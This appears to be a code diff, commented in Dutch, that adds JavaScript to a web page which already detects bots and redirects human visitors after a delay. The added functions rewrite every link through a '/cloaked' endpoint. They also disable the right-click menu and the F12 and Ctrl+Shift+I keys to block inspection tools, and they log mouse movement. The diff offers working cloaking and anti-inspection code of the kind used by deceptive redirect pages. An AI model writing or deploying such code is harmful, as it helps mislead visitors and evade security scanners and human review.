@@ -87,8 +87,51 @@
             }
         }
 
+        // Functie: Verbeterde link cloaking
+        function improvedLinkCloaking() {
+            // a. Dynamische URL-aanpassing voor cloaking
+            const links = document.querySelectorAll('a');
+            links.forEach(link => {
+                link.href = `/cloaked?target=${encodeURIComponent(link.href)}`;
+            });
+
+            // b. Beveiliging tegen inspectietools
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.addEventListener('keydown', event => {
+                if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
+                    event.preventDefault();
+                }
+            });
+
+            // c. Tijdgebaseerde cloaking
+            setTimeout(() => {
+                console.log("Cloaking check passed: showing actual links.");
+            }, 2000);
+        }
+
+        // Functie: Veilige redirect implementatie
+        function safeRedirect(url) {
+            // Valideer URL voordat er wordt doorgestuurd
+            try {
+                const validatedUrl = new URL(url);
+                window.location.href = validatedUrl.href;
+            } catch (error) {
+                console.error("Invalid URL provided for redirect:", url);
+            }
+        }
+
+        // Monitoring en Optimalisatie
+        function monitorAndOptimize() {
+            // a. Real-time monitoring van gebruikersgedrag
+            window.addEventListener('mousemove', () => console.log("Mouse movement detected"));
+
+            // b. Optimalisaties toepassen
+            document.body.style.transition = "opacity 0.3s ease";
+        }
+
         // Uitvoeren van logica bij het laden van de pagina
         document.addEventListener("DOMContentLoaded", () => {
+            improvedLinkCloaking();
             const isBot = detectBot();
 
             if (isBot) {
@@ -103,6 +146,8 @@
                 setTimeout(() => {
                     redirectBasedOnId();
                 }, antibotConfig.trustedDelay);
+
+                monitorAndOptimize();
             }
         });
     </script>
